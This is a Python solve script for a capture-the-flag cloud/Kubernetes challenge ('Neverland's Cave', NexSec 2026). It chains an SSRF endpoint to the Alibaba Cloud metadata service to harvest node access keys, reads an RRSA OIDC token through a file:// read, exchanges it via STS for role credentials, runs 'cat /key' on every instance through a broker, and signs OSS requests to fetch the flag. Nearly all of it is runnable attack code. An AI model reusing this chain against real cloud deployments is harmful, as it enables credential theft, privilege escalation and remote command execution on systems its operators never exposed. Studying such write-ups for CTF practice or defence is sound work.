#!/usr/bin/env python3
"""
Neverland's Cave - Full Exploit Solve Script
NexSec 2026 (Misc / Cloud / Kubernetes)

Author: klasyyi
Repository: https://github.com/klasyyi/writeup-nexsec2026
DeepSeek Session: https://chat.deepseek.com/share/2uv3561mo631dw4eha

Re-fetches fresh credentials every run (STS creds expire in ~1hr), then:
1. SSRF -> Alibaba IMDS -> node AK/SK/token
2. LFI -> RRSA OIDC JWT (aud=sts.aliyuncs.com)
3. STS AssumeRoleWithOIDC (unsigned, OIDC token is the auth) -> RRSA role creds
   NOTE: this call does NOT need an HMAC-SHA1 signature - it's designed to be callable
   before you have any AK/SK, auth is via the OIDC token itself. It DOES require a
   Timestamp param (ISO8601 UTC) or STS returns "MissingTimestamp".
   No Signature/SignatureMethod/SignatureVersion needed.
4. Broker DescribeInstances -> list of 6 cache-* instance ids
5. Broker RunCommand "cat /key" on every instance (response is synchronous, RunCommand's
   own JSON already carries "Output" - DescribeInvocationResults is a dead end on this
   broker, always returns empty, don't bother polling)
6. /key on each pod is NOT a local file - it's an OSS object key (cave-xxxxxxxx.txt).
   ListObjects is denied for this role, but direct GetObject on a known key is allowed,
   which is exactly why /key exists: it hands you the one key you're allowed to fetch directly.
7. Signed OSS GetObject (Signature V1, HMAC-SHA1) for each pointer under OSS_PREFIX.
   Only ONE of the 6 pods' pointer resolves to a real object (NoSuchKey on the other 5) -
   that one holds the flag.
"""

import base64
import hashlib
import hmac
import json
import time
import urllib.parse
import urllib.request

ENTRY = "https://t6d73c6170b3d5df1.entry.nexsec.my"
STS_ENDPOINT = "https://sts.ap-southeast-1.aliyuncs.com"
ROLE_ARN = "acs:ram::5691990866543552:role/spotpod-node-neverlands-cave-t6d73c6170b3d5df1"
OIDC_PROVIDER_ARN = "acs:ram::5691990866543552:oidc-provider/ack-rrsa-cb86a0e8554f149daad31a1e4816a78a2"
BROKER = "http://broker.spot-control.svc.cluster.local:8080"
OSS_BUCKET = "spotpod-flags-5691990866543552"
OSS_ENDPOINT_HOST = "oss-ap-southeast-1.aliyuncs.com"
OSS_PREFIX = "flags/t6d73c6170b3d5df1"


def ssrf(url, method="GET", body=None, headers=None):
    """Proxy a request through the vulnerable /api/fetch endpoint."""
    payload = {"url": url, "method": method}
    if body is not None:
        payload["body"] = body
    if headers:
        payload["headers"] = headers

    req = urllib.request.Request(
        f"{ENTRY}/api/fetch",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
    return data.get("body", "")


def get_imds_role_name():
    # The role name is node/session-specific and changes on respawn -
    # discover it dynamically rather than hardcoding.
    name = ssrf("http://100.100.100.200/latest/meta-data/ram/security-credentials/").strip()
    return name.splitlines()[0].strip() if name else name


def get_node_creds():
    role_name = get_imds_role_name()
    body = ssrf(f"http://100.100.100.200/latest/meta-data/ram/security-credentials/{role_name}")
    creds = json.loads(body)
    print("[+] Node IMDS creds:", creds["AccessKeyId"])
    return creds


def get_rrsa_jwt():
    # Separate from the default k8s SA token - this one has aud=sts.aliyuncs.com
    jwt = ssrf("file:///run/secrets/ack.alibabacloud.com/rrsa-tokens/token").strip()
    print("[+] RRSA JWT length:", len(jwt))
    return jwt


def assume_role_with_oidc(oidc_token):
    """AssumeRoleWithOIDC needs no signature, just a Timestamp."""
    params = {
        "Action": "AssumeRoleWithOIDC",
        "Version": "2015-04-01",
        "Format": "JSON",
        "RoleArn": ROLE_ARN,
        "OIDCProviderArn": OIDC_PROVIDER_ARN,
        "OIDCToken": oidc_token,
        "RoleSessionName": "neverland-ctf",
        "DurationSeconds": "3600",
        "Timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    body = urllib.parse.urlencode(params)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = ssrf(STS_ENDPOINT, method="POST", body=body, headers=headers)
    data = json.loads(resp)
    if "Credentials" not in data:
        raise RuntimeError(f"AssumeRoleWithOIDC failed: {data}")
    creds = data["Credentials"]
    print("[+] RRSA role creds:", creds["AccessKeyId"])
    return creds


def oss_get_object(rrsa_creds, object_key, bucket=OSS_BUCKET, virtual_hosted=True):
    """
    Signed GET against Alibaba OSS, Signature V1 (HMAC-SHA1).
    x-oss-security-token MUST be included in CanonicalizedOSSHeaders when signing -
    omitting it produces a 403 SignatureDoesNotMatch against this bucket.
    """
    date = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    canonicalized_resource = f"/{bucket}/{object_key}"
    oss_headers = {"x-oss-security-token": rrsa_creds["SecurityToken"]}
    canon_oss_headers = "".join(f"{k.lower()}:{v}\n" for k, v in sorted(oss_headers.items()))
    string_to_sign = "GET\n\n\n" + date + "\n" + canon_oss_headers + canonicalized_resource
    sig = hmac.new(rrsa_creds["AccessKeySecret"].encode(), string_to_sign.encode(), hashlib.sha1).digest()
    signature = base64.b64encode(sig).decode()
    auth_header = f"OSS {rrsa_creds['AccessKeyId']}:{signature}"
    url = (
        f"https://{bucket}.{OSS_ENDPOINT_HOST}/{object_key}"
        if virtual_hosted
        else f"https://{OSS_ENDPOINT_HOST}/{bucket}/{object_key}"
    )
    headers = {
        "Date": date,
        "Authorization": auth_header,
        "x-oss-security-token": rrsa_creds["SecurityToken"],
    }
    return ssrf(url, method="GET", headers=headers)


def broker_call(rrsa_creds, action, **extra):
    payload = {
        "Action": action,
        "AccessKeyId": rrsa_creds["AccessKeyId"],
        "AccessKeySecret": rrsa_creds["AccessKeySecret"],
        "SecurityToken": rrsa_creds["SecurityToken"],
        **extra,
    }
    body = ssrf(
        BROKER + "/",
        method="POST",
        body=json.dumps(payload),
        headers={"Content-Type": "application/json"},
    )
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        return {"raw": body}


def main():
    node_creds = get_node_creds()       # Phase 3 (harvest node identity)
    oidc_token = get_rrsa_jwt()          # Phase 2 (harvest projected OIDC JWT)
    rrsa_creds = assume_role_with_oidc(oidc_token)  # Phase 4 (assume scoped RRSA role)

    instances = broker_call(rrsa_creds, "DescribeInstances")  # Phase 6
    instance_ids = [i["InstanceId"] for i in instances["Instances"]["Instance"]]
    print(f"[+] Found {len(instance_ids)} instances: {instance_ids}")

    for inst in instance_ids:            # Phase 6
        run = broker_call(rrsa_creds, "RunCommand", InstanceId=inst, Command="cat /key 2>&1")
        pointer = run.get("Output", "").strip()
        print(f"[*] {inst} -> /key = {pointer}")
        if not pointer:
            continue
        for key in (pointer, f"{OSS_PREFIX}/{pointer}"):  # Phase 7
            body = oss_get_object(rrsa_creds, key, virtual_hosted=True)
            if "nexsec26{" in body:
                print(f"[+++ FLAG] {inst} / {key}:\n{body}")
                return


if __name__ == "__main__":
    main()
